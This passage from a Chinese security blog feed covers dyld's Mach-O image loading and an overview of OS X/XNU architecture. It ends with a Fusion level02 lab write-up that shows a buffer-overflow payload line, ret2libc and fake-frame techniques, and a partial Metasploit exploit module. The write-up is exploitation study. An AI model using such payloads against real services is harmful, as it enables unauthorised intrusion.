<h3 id="1-2-7_addimage">1.2.7 addimage</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addImage</span><span class="params">(ImageLoader* image)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">// add to master list</span></span><br><span class="line">	<span class="comment">// 对所有images的容器原子添加image</span></span><br><span class="line">    allImagesLock();</span><br><span class="line">        sAllImages.push_back(image);</span><br><span class="line">    allImagesUnlock();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// update mapped ranges</span></span><br><span class="line">	<span class="comment">// 更新内存分布的数据</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> lastSegStart = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uintptr_t</span> lastSegEnd = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>, e=image-&gt;segmentCount(); i &lt; e; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( image-&gt;segUnaccessible(i) ) </span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">uintptr_t</span> start = image-&gt;segActualLoadAddress(i);</span><br><span class="line">		<span class="keyword">uintptr_t</span> end = image-&gt;segActualEndAddress(i);</span><br><span class="line">		<span class="keyword">if</span> ( start == lastSegEnd ) &#123;</span><br><span class="line">			<span class="comment">// two segments are contiguous, just record combined segments</span></span><br><span class="line">			lastSegEnd = end;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// non-contiguous segments, record last (if any)</span></span><br><span class="line">			<span class="keyword">if</span> ( lastSegEnd != <span class="number">0</span> )</span><br><span class="line">				addMappedRange(image, lastSegStart, lastSegEnd);</span><br><span class="line">			lastSegStart = start;</span><br><span class="line">			lastSegEnd = end;</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ( lastSegEnd != <span class="number">0</span> )</span><br><span class="line">		addMappedRange(image, lastSegStart, lastSegEnd);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( sEnv.DYLD_PRINT_LIBRARIES || (sEnv.DYLD_PRINT_LIBRARIES_POST_LAUNCH &amp;&amp; (sMainExecutable!=<span class="literal">NULL</span>) &amp;&amp; sMainExecutable-&gt;isLinked()) ) &#123;</span><br><span class="line">		dyld::<span class="built_in">log</span>(<span class="string">"dyld: loaded: %s\n"</span>, image-&gt;getPath());</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>addimage也只是做了一些数据更新</p>
<ul>
<li>将image添加到管理容器中</li>
<li>更新了内存分布的信息</li>
</ul>
<h1 id="0x02_小结">0x02 小结</h1><p>整个加载过程基本分为三个部分</p>
<ul>
<li>数据合法检测</li>
<li>根据mach-o文件的头部信息,将segments的具体信息构建到image的实例中</li>
<li>添加image到管理容器</li>
</ul>
<p>重要的几个函数如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld_macho_load/Calls-instantiateFromLoadedImage.png" alt="重要函数"></p>
<p>​    </p>
<p>那么mach-o文件的加载流程更多的细节就需要通过分析xnu内核了。</p>
<h1 id="reference">reference</h1><p>1.对dyld的分析(源码.代码签名等) </p>
<p><a href="http://cocoahuke.com/2016/02/14/dyld%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/" target="_blank" rel="external">http://cocoahuke.com/2016/02/14/dyld%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/</a></p>
<p>2.mach-o文件加载的全过程(1)</p>
<p><a href="http://dongaxis.github.io/2015/01/01/mac-o%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B-1/" target="_blank" rel="external">http://dongaxis.github.io/2015/01/01/mac-o%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B-1/</a></p>
<p>PS：</p>
<p>更多文章可以在我的学习分享博客<a href="http://BLOGIMAGE/找到，希望可以多多交流，不足之处还希望大家可以给与指正：）" target="_blank" rel="external">http://BLOGIMAGE/找到，希望可以多多交流，不足之处还希望大家可以给与指正：）</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>[TOC]</p>
<h1 id="0x00_内容简介">0x00 内容简介</h1><blockquote>
<p> Les commencements ont des charmes inexprimables.<br> 万物初始，美妙不可名状。</p>
</blockquote>
<p>通过阅读dyld源码，简单的分析macho在dyld中是如何被加载到内存中的。</p>]]>
    
    </summary>
    
      <category term="dyld" scheme="http://yoursite.com/tags/dyld/"/>
    
      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
    
      <category term="osx" scheme="http://yoursite.com/tags/osx/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[OS X 内核研究 准备知识]]></title>
    <link href="http://yoursite.com/2016/02/29/OS-X-%E5%86%85%E6%A0%B8%E7%A0%94%E7%A9%B6-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2016/02/29/OS-X-内核研究-基础知识/</id>
    <published>2016-02-29T22:20:48.000Z</published>
    <updated>2016-03-24T03:37:43.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><blockquote>
<p>子贡问为仁。子曰：“工欲善其事，必先利其器。居是邦也，事其大夫之贤者，友其士之仁者。”<br>—《论语·卫灵公》</p>
</blockquote>
<p>​    在开始研究OSX内核以及与OSX相关知识之前，需要对OSX有一个比较全面的认识，将一些简单的概念搞清楚。</p>
<a id="more"></a>
<h1 id="0x01_OS_X_体系结构">0x01 OS X 体系结构</h1><p>​    </p>
<h2 id="1-1_OS_X系统的整体体系结构">1.1    OS X系统的整体体系结构</h2><ul>
<li>用户体验(                                                                                The User Experience layer                                    )：为了研究内核做准备，赞不关心。</li>
<li>应用软件开发框架（The Application Frameworks layer）：Cocoa, Carbon, Java这些开发的API与运行时。</li>
<li>核心开发框架（The Core Frameworks）：图形和多媒体一类软件的开发环境。</li>
<li>Darwin：系统内核。</li>
</ul>
<p>google了其他一些文章，分层也是基本差不多，可以参考此图：</p>
<p><img src="http://img.blog.163.com/photo/1JwDZEzqv4v1GGBEwOxUMg==/2605895334387332224.jpg" alt="os x 系统整体结构"></p>
<h2 id="1-2_Darwin体系结构">1.2 Darwin体系结构</h2><p>主要关心的其实还是Darwin这个模块，他的体系结构大致如下图所示:</p>
<p><img src="http://1.bp.blogspot.com/-aOeN0GyAGWQ/VIUPXg1fRVI/AAAAAAAAGzY/nYZrfMz4b7o/s1600/Screen%2BShot%2B2014-12-08%2Bat%2B8.06.57%2Bam.png" alt="Darwin"></p>
<p>这个图暂时看不懂也没关系，需要做到的知识储备有以下几点：</p>
<ul>
<li>Darwin是苹果系统的<strong>一部分</strong>。</li>
<li>Darwin是一种类似unix的操作系统，他的<strong>核心</strong>是XNU。</li>
<li>XNU是一种混合式内核。结合了<strong>mach</strong>与<strong>BSD</strong>两种内核。</li>
</ul>
<h2 id="1-3_XNU的简单概括">1.3 XNU的简单概括</h2><p>有以下4个主要的功能模块：</p>
<ul>
<li><p>Mach微内核</p>
</li>
<li><p>BSD内核</p>
</li>
<li><p>libKern</p>
</li>
<li><p>I/O Kit</p>
</li>
</ul>
<h3 id="1-3-1_Mach微内核简介">1.3.1 Mach微内核简介</h3><p>​    </p>
<p>Mach是作为传统<a href="https://zh.wikipedia.org/wiki/UNIX" target="_blank" rel="external">UNIX</a>内核的替代品出现的，因此其间的不同之处值得留意。当时的人们已渐渐感受到了早期UNIX中“一切皆文件”的抽象机制的不足，有限的扩展性使得开发者捉襟掣肘，苦不堪言。虽说贝尔实验室的<a href="https://zh.wikipedia.org/w/index.php?title=Plan9&amp;action=edit&amp;redlink=1" target="_blank" rel="external">Plan9</a>在此方向上做了进一步努力，可是效果并不理想。现代操作系统需要更进一步的抽象[1]。</p>
<p>在XNU中主要完成以下几个功能：</p>
<ul>
<li>进程与线程的抽象</li>
<li>虚拟内存管理</li>
<li>任务调度</li>
<li>进程间通信</li>
</ul>
<h3 id="1-3-2_BSD内核简介">1.3.2 BSD内核简介</h3><p>BSD的实现在Mach的上层，这一层提供了一些流行的API，支持了<a href="https://zh.wikipedia.org/wiki/POSIX" target="_blank" rel="external">POSIX</a>。在XNU中主要实现了一些高级的API与模块。</p>
<ul>
<li>UNIX进程模型</li>
<li>POSIX线程模型即pthread。以及相关的同步功能。</li>
<li>UNIX的用户与组管理</li>
<li>网络栈(BSD Socket API)</li>
<li>文件系统</li>
<li>设备系统</li>
</ul>
<h3 id="1-3-3_libKern">1.3.3 libKern</h3><p>libKern实现了一个C++的子集，为I/O kit 提供C++的实现。</p>
<h3 id="1-3-4_I/O_kit">1.3.4 I/O kit</h3><p>I/O Kit 是XNU不同于其他传统系统的设备驱动框架。</p>
<p>IOKit是一个面向对象的驱动模型框架，它是早期DriverKit的一个翻版，Driver Kit是使用Objective-C写的，而IOKit是一个C++的驱动架构，它在DriverKit的基础上做了很大的改进，比如IOKit可以写在用户空间跑的驱动（虽然大多仍是跑在内核空间上的），因而驱动挂了而系统不会挂。另外IOKit考虑到了计算机发展的趋势，所以在电源管理、即插即用、动态加载上做得更好[2]。</p>
<h2 id="1-4_APPs的文件结构">1.4 APPs的文件结构</h2><p>每一个应用程序都是这样一个大致类似的文件结构。</p>
<p><img src="http://www.monobjc.net/assets/screenshots/Bundle_Managed.png" alt="bundle"></p>
<h3 id="1-4-1_Info-plist">1.4.1 <strong>Info.plist</strong></h3><p> 为了提供更好的用户体验，IOS 和 OS X的每个app或bundle都依赖于特殊的元信息(meta Information).</p>
<ul>
<li>直接向用户展示信息</li>
<li>系统内部用来标识你的app或其支持的文档类型</li>
<li><p>系统框架用来辅助app的加载</p>
<p>每个application都使用Info.plist文件来存储以上的元信息，从名称上也可以判断出Info.plist就是以上提到的“属性列表”[3]。</p>
</li>
</ul>
<h3 id="1-4-2_Resources">1.4.2 Resources</h3><p>就是APP需要的资源。与我们研究内容关系不大不多关注。</p>
<h3 id="1-4-3_MacOS">1.4.3 MacOS</h3><p>这里存放的就是<strong>可执行文件</strong>。</p>
<h1 id="0x02_OS_X使用的安全机制">0x02 OS X使用的安全机制</h1><h2 id="2-1_代码签名">2.1 代码签名</h2><p><strong>肤浅的理解就是确认APP是通过了苹果审核的，可以认为是没有恶意的。</strong></p>
<p>摘录了一段比较详细的描述：</p>
<blockquote>
<p>作为一个 iOS 开发者，在你开发使用的机器上应该已经有一个证书，一个公钥，以及一个私钥。这些是代码签名机制的核心。像 SSL 一样，代码签名也依赖于采用 X.509 标准的公开密钥加密。</p>
<p>在 OS X 上一个应用是否允许被开启是由 Gatekeeper 的选项决定的，你可以在系统设置的安全选项中改变选项。在 Gatekeeper 选项中选择 “受信任的开发者或者来自 Mac App Store” 会要求被打开的应用必须被证书签名，可以是 Mac App Store 开发者的应用发布证书也可以是开发者 ID 证书。这些选项是由一个系统工具 spctl 来管理的，它管理着系统的所有安全评估策略。</p>
<p>在 iOS 上规则是不一样的，无论是用户还是开发者都不能改变应用开启策略，你必须有一个开发者帐号或者应用发布证书才能让应用运行在 iOS 系统上[4]。</p>
</blockquote>
<h2 id="2-2_强制访问控制_(Mandatory_Access_Control)">2.2 强制访问控制 (Mandatory Access Control)</h2><p>FreeBSD 5.x最早引入，是OS X<code>隔离机制（Sandboxing，沙盒机制）</code>和iOS的<code>entitlement机制</code>基础。</p>
<blockquote>
<p>强制访问控制（Mandatory Access Control——MAC），用于将系统中的信息分密级和类进行管理，以保证每个用户只能访问到那些被标明可以由他访问的信息的一种访问约束机制。通俗的来说，在强制访问控制下，用户（或其他主体）与文件（或其他客体）都被标记了固定的安全属性（如安全级、访问权限等），在每次访问发生时，系统检测安全属性以便确定一个用户是否有权访问该文件。</p>
</blockquote>
<h2 id="2-3_沙盒（sandbox）">2.3 沙盒（sandbox）</h2><p>沙盒是一种安全机制，为运行中的程序提供了一个隔离的环境。OS X的沙盒在启动的时候可以设置运行的程序是否可以访问网络、文件、目录等。</p>
<p><img src="http://blog.okeyang.com/images/2015/sandbox_architecture.png" alt="sandbox">图片摘自<a href="http://blog.okeyang.com/blog/2015/07/24/shen-ru-jie-xi-mac-os-x-and-ioscao-zuo-xi-tong--du-shu-bi-ji/" target="_blank" rel="external">这里</a>[5]。</p>
<h1 id="参考">参考</h1><p>[1].Mach — <a href="https://zh.wikipedia.org/wiki/Mach" target="_blank" rel="external">https://zh.wikipedia.org/wiki/Mach</a></p>
<p>[2].OSX系统编程环境的介绍 — <a href="http://www.tanhao.me/talk/440.html/" target="_blank" rel="external">http://www.tanhao.me/talk/440.html/</a></p>
<p>[3].IOS之Info.plist文件简介 — <a href="http://my.oschina.net/hmj/blog/104196" target="_blank" rel="external">http://my.oschina.net/hmj/blog/104196</a></p>
<p>[4]代码签名探析 — <a href="http://http://objccn.io/issue-17-2/" target="_blank" rel="external">http://http://objccn.io/issue-17-2/</a></p>
<p>[5]《深入解析Mac OS X &amp; iOS操作系统》读书笔记 —<a href="http://blog.okeyang.com/blog/2015/07/24/shen-ru-jie-xi-mac-os-x-and-ioscao-zuo-xi-tong--du-shu-bi-ji/" target="_blank" rel="external">http://blog.okeyang.com/blog/2015/07/24/shen-ru-jie-xi-mac-os-x-and-ioscao-zuo-xi-tong--du-shu-bi-ji/</a></p>
<p>  ​</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><blockquote>
<p>子贡问为仁。子曰：“工欲善其事，必先利其器。居是邦也，事其大夫之贤者，友其士之仁者。”<br>—《论语·卫灵公》</p>
</blockquote>
<p>​    在开始研究OSX内核以及与OSX相关知识之前，需要对OSX有一个比较全面的认识，将一些简单的概念搞清楚。</p>]]>
    
    </summary>
    
      <category term="OSX" scheme="http://yoursite.com/tags/OSX/"/>
    
      <category term="kernel" scheme="http://yoursite.com/tags/kernel/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[通过fusion level02浅谈exploit中的函数调用伪造]]></title>
    <link href="http://yoursite.com/2016/02/23/%E9%80%9A%E8%BF%87fusion%20level02%E6%B5%85%E8%B0%88exploit%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%BC%AA%E9%80%A0/"/>
    <id>http://yoursite.com/2016/02/23/通过fusion level02浅谈exploit中的函数调用伪造/</id>
    <published>2016-02-23T14:45:47.000Z</published>
    <updated>2016-03-24T03:39:19.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_内容简介">0x00 内容简介</h1><p>​       通过一道<a href="https://exploit-exercises.com/fusion/level02/" target="_blank" rel="external">exploit-exercises</a>中的题目的解答来体会frame faking在实际的利用中的使用技巧。通过实践了网上的两个writeup并进行分析，加深理解做了简单的总结。</p>
<a id="more"></a>
<h1 id="0x01_获得EIP控制">0x01 获得EIP控制</h1><p>题目的地址在<a href="https://exploit-exercises.com/fusion/level02/" target="_blank" rel="external">这里</a>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"../common/common.c"</span>    </span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> XORSZ <span class="number">32</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *blah, size_t len)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">int</span> keyed;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> keybuf[XORSZ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> blocks;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *blahi, j;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(keyed == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> fd;</span><br><span class="line">      fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">      <span class="keyword">if</span>(read(fd, &amp;keybuf, <span class="keyword">sizeof</span>(keybuf)) != <span class="keyword">sizeof</span>(keybuf)) <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      close(fd);</span><br><span class="line">      keyed = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  blahi = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(blah);</span><br><span class="line">  blocks = (len / <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span>(len &amp; <span class="number">3</span>) blocks += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; blocks; j++) &#123;</span><br><span class="line">      blahi[j] ^= keybuf[j % XORSZ];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt_file</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="comment">// http://thedailywtf.com/Articles/Extensible-XML.aspx</span></span><br><span class="line">  <span class="comment">// maybe make bigger for inevitable xml-in-xml-in-xml ?</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> buffer[<span class="number">32</span> * <span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> op;</span><br><span class="line">  <span class="keyword">size_t</span> sz;</span><br><span class="line">  <span class="keyword">int</span> loop;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[-- Enterprise configuration file encryption service --]\n"</span>);</span><br><span class="line"></span><br><span class="line">  loop = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(loop) &#123;</span><br><span class="line">      nread(<span class="number">0</span>, &amp;op, <span class="keyword">sizeof</span>(op));</span><br><span class="line">      <span class="keyword">switch</span>(op) &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">              nread(<span class="number">0</span>, &amp;sz, <span class="keyword">sizeof</span>(sz));</span><br><span class="line">              nread(<span class="number">0</span>, buffer, sz);</span><br><span class="line">              cipher(buffer, sz);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"[-- encryption complete. please mention "</span></span><br><span class="line">              <span class="string">"474bd3ad-c65b-47ab-b041-602047ab8792 to support "</span></span><br><span class="line">              <span class="string">"staff to retrieve your file --]\n"</span>);</span><br><span class="line">              nwrite(<span class="number">1</span>, &amp;sz, <span class="keyword">sizeof</span>(sz));</span><br><span class="line">              nwrite(<span class="number">1</span>, buffer, sz);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">'Q'</span>:</span><br><span class="line">              loop = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">              <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line"></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  encrypt_file();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​    获得<strong>EIP控制</strong>的方法可以参考一下两位前辈的分享，已经说得比较清楚了。</p>
<p>解答1.<a href="https://philwantsfish.github.io/fusion-level02-walkthrough/" target="_blank" rel="external">Exploit Exercises - Fusion level02 write up(英文)</a></p>
<p>解答2.<a href="http://www.programlife.net/fusion-level-02.html" target="_blank" rel="external">Exploit-Exercises Fusion Level02(中文)</a></p>
<p>大致的说一下流程。</p>
<p>1.获取KEY</p>
<p>​       发送自定义数据给服务器，服务器返回异或后的数据，计算得到异或使用的KEY。</p>
<p>​    2.EIP控制</p>
<p>​       将PAYLOAD使用异或加密后发送给服务器，服务器会通过异或解密，这样可以往内存中写入可控的数据。</p>
<p>tips：缓冲区大小为32*4096=0x20000,所以获得eip的偏移其实很简单。    </p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x20020</span>+[<span class="string">"0xdeadbeef"</span>].pack(<span class="string">'V'</span>)</span><br></pre></td></tr></table></figure>
<p>在调试的时候适当的减少<strong>0x20020</strong>的值，然后再次运行poc，就能很简单的找到<code>offset=0x20010</code>。</p>
<h1 id="0x02_利用思路">0x02 利用思路</h1><p>在获得EIP的控制权之后，解答1与解答2都是用了伪造函数调用的方法来实现对漏洞的利用。之前我的文章中介绍过两种伪造函数帧来实现流程控制的方法。<a href="http://BLOGIMAGE/2016/01/27/frame-faking/" target="_blank" rel="external">frame-faking-介绍-函数调用伪造</a>中有详细的分析。</p>
<h2 id="2-1_ret2lib解决方案">2.1 ret2lib解决方案</h2><p>解答1使用了经典的ret2lib的方法，并且在第一次调用<code>nread</code>之后，巧妙的利用<strong>ROP完成了清空栈上参数</strong>，为第二次调用<code>execve</code>做好准备。</p>
<h2 id="2-2_fake-frame解决方案">2.2 fake-frame解决方案</h2><p>解答2使用了fake-frame的方式，在调用<code>nread</code>之前，将ebp指向了.bss段，这样在nread调用完成之后，EIP就指向EBP+4处。</p>
<h1 id="0x03_ret2lib详细分析">0x03 ret2lib详细分析</h1><h2 id="3-1exploit源码">3.1exploit源码</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'msf/core'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Metasploit3</span> <span class="inheritance">&lt; <span class="parent">Msf::Exploit</span></span>::<span class="title">Remote</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="constant">Msf::Exploit::Remote::Tcp</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">()</span></span></span><br><span class="line">    [...]				<span class="comment">#不重要</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(len, data)</span></span></span><br><span class="line">    buffer = <span class="string">"E"</span> + [len].pack(<span class="string">'L'</span>) + data</span><br><span class="line">    sock.put(buffer)</span><br><span class="line">    msg = buffered_recv(<span class="number">124</span>)</span><br><span class="line">    enc_data = buffered_recv(len)</span><br><span class="line">    <span class="keyword">return</span> enc_data</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">buffered_recv</span><span class="params">(size)</span></span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    new_data = <span class="string">""</span></span><br><span class="line">    size_to_receive = size</span><br><span class="line">    <span class="keyword">while</span>(data.length &lt; size) <span class="keyword">do</span></span><br><span class="line">      new_data = sock.recv(size_to_receive)</span><br><span class="line">      size_to_receive -= new_data.length</span><br><span class="line">      data += new_data</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    data</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">xor_encrypt</span><span class="params">(data, key)</span></span></span><br><span class="line">    <span class="comment"># Make sure key is the same length as the data</span></span><br><span class="line">    <span class="keyword">while</span> key.length &lt; data.length <span class="keyword">do</span></span><br><span class="line">      key += key</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    key = key[<span class="number">0</span>..data.length-<span class="number">1</span>]  </span><br><span class="line"></span><br><span class="line">    data.unpack(<span class="string">'C*'</span>).zip(key.unpack(<span class="string">'C*'</span>)).map &#123; |p, e| p ^ e&#125;.pack(<span class="string">'C*'</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span 